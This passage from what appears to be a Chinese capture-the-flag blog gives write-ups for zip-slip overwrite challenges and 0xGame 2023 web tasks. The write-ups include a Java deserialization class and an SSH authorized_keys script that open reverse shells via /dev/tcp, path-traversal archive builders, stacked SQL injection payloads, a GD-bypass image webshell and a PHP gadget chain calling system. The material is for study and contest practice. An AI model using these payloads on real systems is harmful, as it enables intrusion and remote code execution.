class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;        in.defaultReadObject();        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/x 0&gt;&amp;1&quot;</span>&#125;);        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));        p.waitFor();        <span class="hljs-keyword">if</span>(p.exitValue()!=<span class="hljs-number">0</span>)&#123;        &#125;        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">while</span>((s=reader.readLine())!=<span class="hljs-literal">null</span>)&#123;            System.out.println(s);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> zipfilezipFile = zipfile.ZipFile(<span class="hljs-string">&quot;poc.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)info = zipfile.ZipInfo(<span class="hljs-string">&quot;poc.zip&quot;</span>)zipFile.write(<span class="hljs-string">&quot;./Evil.class&quot;</span>, <span class="hljs-string">&quot;../../../usr/lib/jvm/java-8-openjdk-amd64/jre/classes/Evil.class&quot;</span>, zipfile.ZIP_DEFLATED)zipFile.close()</code></pre></div><p>本地构造base64，通过反序列化入口反弹shell</p><p>利用相同的类名随便构造字符串进行反序列化</p><p><img src="/../images/zipslip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/image-20231128192157833.png" alt="image-20231128192157833"></p><h2 id="SCTF2023-SycServer"><a href="#SCTF2023-SycServer" class="headerlink" title="SCTF2023  SycServer"></a>SCTF2023  SycServer</h2><p>记得<code>lolita</code>师傅就是通过两场xctf分站赛直接从NAN升入Nu1L，这就是其中一场，太强了</p><p>&#x2F;file-unarchiver 解压zip</p><p>&#x2F;readfile?file&#x3D; 读文件</p><p>&#x2F;readir 列出&#x2F;tmp目录</p><p>&#x2F;admin 对127.0.0.1：2221进行ssh访问</p><p>利用zipslip去覆盖一下私钥，然后admin路由对私钥有一些处理，在admin路由里其实是会执行<code>ssh -i rsa_key vanzy@xxxxx</code>这个指令去读取密钥文件的。然后我们可以再密钥文件里加入一条恶意的语句<br><code>command=xxxxxxx</code>，<br>大致步骤就是</p><ul><li>zipslip去覆盖authorization文件</li><li>访问admin让他读取密钥文件，触发command指令</li><li>获取反弹shell</li></ul><p> tel师傅的exp，随便看看咯   </p><div class="code-wrapper"><pre><code class="hljs vim">import requestsimport osurl = <span class="hljs-string">&quot;http://159.138.131.31:8888/&quot;</span># url = <span class="hljs-string">&quot;http://119.13.91.238:8888/&quot;</span># url = <span class="hljs-string">&quot;http://t-kali:8888/&quot;</span>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;keys&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;command=&quot;bash -c \&#x27;</span>bash -i &gt;&amp; /dev/tcp/vps/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\<span class="hljs-string">&#x27;&quot; &#x27;</span>)    r = requests.<span class="hljs-built_in">get</span>(url + <span class="hljs-string">&quot;readfile?file=/home/vanzy/.ssh/authorized_keys&quot;</span>)    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(r.text)    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;python3 zip.py&quot;</span>)# uploadr = requests.post(url+<span class="hljs-string">&quot;file-unarchiver&quot;</span>,                  <span class="hljs-keyword">files</span>=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;key.zip&quot;</span>, <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;key.zip&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-keyword">read</span>())&#125;)<span class="hljs-keyword">print</span>(r.text)r = requests.<span class="hljs-built_in">get</span>(url + <span class="hljs-string">&quot;readfile?file=/home/vanzy/.ssh/authorized_keys&quot;</span>)<span class="hljs-keyword">print</span>(r.text)r = requests.<span class="hljs-built_in">get</span>(url + <span class="hljs-string">&quot;admin&quot;</span>)<span class="hljs-keyword">print</span>(r.text)</code></pre></div><h2 id="羊城杯2023-ezyaml"><a href="#羊城杯2023-ezyaml" class="headerlink" title="羊城杯2023 ezyaml"></a>羊城杯2023 ezyaml</h2><p>tar的zipslip文件覆盖</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> tarfiledef zipslip(tarinfo):    tarinfo.uid = tarinfo.gid = <span class="hljs-number">1000</span>    tarinfo.uname = tarinfo.gname = &quot;poc&quot;    <span class="hljs-keyword">return</span> tarinfotar = tarfile.<span class="hljs-keyword">open</span>(&quot;poc.tar&quot;,&quot;w|&quot;)fullpath = os.path.<span class="hljs-keyword">join</span>(&quot;../../&quot;,&quot;config/1.yaml&quot;)tar.<span class="hljs-keyword">add</span>(fullpath,<span class="hljs-keyword">filter</span>=zipslip)tar.<span class="hljs-keyword">close</span>()</code></pre></div><h2 id="D3CTF-x-AntCTF-2023-d3go"><a href="#D3CTF-x-AntCTF-2023-d3go" class="headerlink" title="D3CTF x AntCTF 2023    d3go"></a>D3CTF x AntCTF 2023    d3go</h2><p>应该是这一部分</p><div class="code-wrapper"><pre><code class="hljs pgsql">func Upload(c *gin.Context) &#123;f, err := c.FormFile(&quot;file&quot;)<span class="hljs-keyword">if</span> err != nil &#123;c.JSON(<span class="hljs-number">500</span>, Resp&#123;StatusCode: <span class="hljs-number">-1</span>,StatusMsg:  &quot;upload fail&quot;,&#125;)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> (f.<span class="hljs-keyword">Header</span>.<span class="hljs-keyword">Get</span>(&quot;Content-Type&quot;) != &quot;application/zip&quot; &amp;&amp; f.<span class="hljs-keyword">Header</span>.<span class="hljs-keyword">Get</span>(&quot;Content-Type&quot;) != &quot;application/x-zip-compressed&quot;) || <span class="hljs-type">path</span>.Ext(f.Filename) != &quot;.zip&quot; &#123;c.JSON(<span class="hljs-number">500</span>, Resp&#123;StatusCode: <span class="hljs-number">-1</span>,StatusMsg:  &quot;not a zip file&quot;,&#125;)<span class="hljs-keyword">return</span>&#125;uu := <span class="hljs-type">uuid</span>.<span class="hljs-built_in">New</span>()zipPath := <span class="hljs-type">path</span>.<span class="hljs-keyword">Join</span>(&quot;upload&quot;, uu.String()+&quot;.zip&quot;)<span class="hljs-keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != nil &#123;c.JSON(<span class="hljs-number">500</span>, Resp&#123;StatusCode: <span class="hljs-number">-1</span>,StatusMsg:  &quot;save zip fail&quot;,&#125;)<span class="hljs-keyword">return</span>&#125;tree, err := upload.Unzip(zipPath, <span class="hljs-type">path</span>.<span class="hljs-keyword">Join</span>(&quot;unzipped&quot;, uu.String()))<span class="hljs-keyword">if</span> err != nil &#123;c.JSON(<span class="hljs-number">500</span>, Resp&#123;StatusCode: <span class="hljs-number">-1</span>,StatusMsg:  &quot;upload fail&quot;,&#125;)<span class="hljs-keyword">return</span>&#125;c.JSON(<span class="hljs-number">200</span>, Resp&#123;StatusCode: <span class="hljs-number">0</span>,StatusMsg:  &quot;upload success&quot;,Data:       tree.Children,&#125;)</code></pre></div><p>最后是需要zipslip覆盖掉配置文件<code>config.yaml</code>，在其中的url指向热部署的恶意go文件</p><div class="code-wrapper"><pre><code class="hljs cos">import zipfile<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">try</span>:        zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;exp.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)          info = zipfile.ZipInfo(<span class="hljs-string">&quot;exp.zip&quot;</span>)        zipFile.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;config.yaml&quot;</span>, <span class="hljs-string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)          zipFile.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;./shell&quot;</span>, <span class="hljs-string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)         zipFile.<span class="hljs-keyword">close</span>()    except IOError <span class="hljs-keyword">as</span> e:        raise e</code></pre></div><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞利用是很简单的，关键是在文件上传时能不能想到这个漏洞，关键还是在于思路</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>0xGAME-WEB 复现</title>
    <link href="/2023/11/21/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/11/21/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0xGame-2023-（复现）"><a href="#0xGame-2023-（复现）" class="headerlink" title="0xGame 2023 （复现）"></a>0xGame 2023 （复现）</h1><blockquote><p>前言</p><p>本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了</p><p>不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）</p></blockquote><h1 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h1><p>就说一个题吧，其他的确实是新生赛水平</p><h2 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h2><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png" alt="image-20231121233431755"></p><p>提示使用<code>git</code>控制版本</p><p>很久之前看过git执行一些命令，当时没遇到过题目，不知道什么意思</p><p>首先工具要对，之前用的是<code>GitHack</code>，只能下载.git的代码，其他啥也不行</p><p>要用<code>GitHacker</code>，能完善的保留历史数据，所以才能使用git的一些命令</p><p><a href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233909751.png" alt="image-20231121233909751"></p><p>遗憾的是明明用了源代码的docker来复现，但是却没有<code>.git</code>泄露，所以只能看wp写了</p><div class="code-wrapper"><pre><code class="hljs bash">githacker --url http://localhost:8013/ --output-folder <span class="hljs-built_in">test</span></code></pre></div><p>以下操作在<code>.git</code>生成的文件夹下操作</p><p>然后使用<code>git log</code>查看历史commits （wp说是<code>git commit</code>，但我网上查的是<code>git log</code>）</p><p>会出现如下（wp的图）</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234500050.png" alt="image-20231121234500050"></p><div class="code-wrapper"><pre><code class="hljs bash">git reset --hard HEAD^    //回退上一个版本</code></pre></div><p>cmd起一个http server，访问网址，即可看到flag</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121234829429.png" alt="image-20231121234829429"></p><p>在文件中硬找也可以</p><h1 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h1><h2 id="ez-sqli"><a href="#ez-sqli" class="headerlink" title="ez_sqli"></a>ez_sqli</h2><p>尝试<code>&#39;</code>报错后是flask框架，泄露了一部分源代码，使用<code>cursor.execute()</code>执行语句</p><p><code>cursor.execute()</code>支持多语句查询，可以使用堆叠注入</p><p>但是waf很严重，没有<code>select database table and or column ...... 空格也被禁了 </code></p><p>想尝试<code>handler</code>，但是<code>and</code>被禁了，这是我没想到的</p><p>看wp，使用MYSQL预处理 (set prepare execute)进行绕过，跟MSSQL的<code>declare exec</code>差不多</p><p>代码特地开了 debug 模式, 这样方便通过报错注入直接回显数据, 当然也可以用时间盲注, 或者一些其它的方式, 比如直接 insert flag</p><p>我想写一句话木马，但是<code>secure_file_priv</code>没权限</p><p>那就报错注入一步一步试</p><p>但是读取时会有长度限制，使用<code>substr</code>就行，或者right、left、mid也行</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># step 1 </span><span class="hljs-attribute">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr((select flag from flag),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>); <span class="hljs-comment"># step 2 </span><span class="hljs-attribute">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr((select flag from flag),<span class="hljs-number">31</span>,<span class="hljs-number">99</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs sql"># step <span class="hljs-number">1</span>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783765292c31293b</span>;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;# step <span class="hljs-number">2</span>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c30783765292c31293b</span>;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;</code></pre></div><p>很好，又完成了一个知道但没用过的方法</p><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>上传jpg的一句话木马文件，会有函数报错</p><p>这是通过 content-type 判断图片类型并调用对应的 imagecreatefromXXX 和 imgXXX 函数, 这些函数来自 PHP GD 库, 这个库主要负责处理图片</p><p>考点明确就是二次渲染</p><p>如果只是在图片的末尾简单的添加了 PHP 代码并上传, 那么经过二次渲染之后的图片是不会包含这段代码的, 因此需要去找一些绕过 GD 库二次渲染的脚本, 然后再构造图片马</p><p>gif能通过先上传文件后，然后下载上传后的文件，比对区别，在没被处理的地方插入一句话木马</p><p>但是png和jpg都有格式要求，参考文章的做法<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);&#125;<span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>直接用文章脚本</p><p>我这里docker启动不知道哪里有问题，上传的文件都访问不了，复现不成功</p><p>wp说注意修改文件后缀和 content-type (题目并没有限制文件后缀, 只有二次渲染这一个考点)</p><p>但是修改content-type好像会报错（但好像确实能上传成功）</p><p>结果</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122001325958.png" alt="image-20231122001325958"></p><p>真的不行啊，明明都给了docker为什么环境还会出问题呢</p><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>感觉有点抽象，他自己设置了php版本为5.6，可以直接用修改属性个数绕过<code>__wakeup</code>，但wp说用引用绕过，那么为什么不直接设置php版本高一点呢</p><p>但确实要是版本出的高一点确实也做不出来了</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;        <span class="hljs-variable language_">$this</span>-&gt;expired = False;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;expired = False;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123;            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);            <span class="hljs-keyword">return</span> True;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> False;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) &#123;            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();        &#125;        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;        &#125;    &#125;&#125;</code></pre></div><p>给出wp的payload</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<span class="hljs-variable">$helper</span>-&gt;funcs = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>);<span class="hljs-variable">$cache1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<span class="hljs-variable">$cache1</span>-&gt;expired = False;      <span class="hljs-comment">//没什么用，实例化时就是false</span><span class="hljs-variable">$cache2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<span class="hljs-variable">$cache2</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<span class="hljs-variable">$cache2</span>-&gt;key = <span class="hljs-string">&#x27;id&#x27;</span>;<span class="hljs-variable">$storage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<span class="hljs-variable">$storage</span>-&gt;store = &amp;<span class="hljs-variable">$cache2</span>-&gt;expired;<span class="hljs-variable">$dataObject</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<span class="hljs-variable">$dataObject</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$cache1</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$cache2</span>);<span class="hljs-variable">$dataObject</span>-&gt;storage = <span class="hljs-variable">$storage</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$dataObject</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>确实很细节，<code>$storage-&gt;store = &amp;$cache2-&gt;expired;</code>，当store数组中有值时，<code>Cache</code>中的<code>$this-&gt;expired)</code>就可以返回<code>true</code></p><p>所以要先在数组中放入一个没有任何用的<code>$cache1</code>，为什么是实例化的Cache呢，是为了防止在<code>Storage</code>的 <code>if (!$value-&gt;expired()) &#123;</code>中报错</p><p><code>$dataObject-&gt;data = array(&#39;key1&#39; =&gt; $cache1, &#39;key2&#39; =&gt; $cache2);</code>顺序不能反着来</p><h2 id="ez-sandbox"><a href="#ez-sandbox" class="headerlink" title="ez_sandbox"></a>ez_sandbox</h2><p>几乎没做过沙箱题目</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;    <span 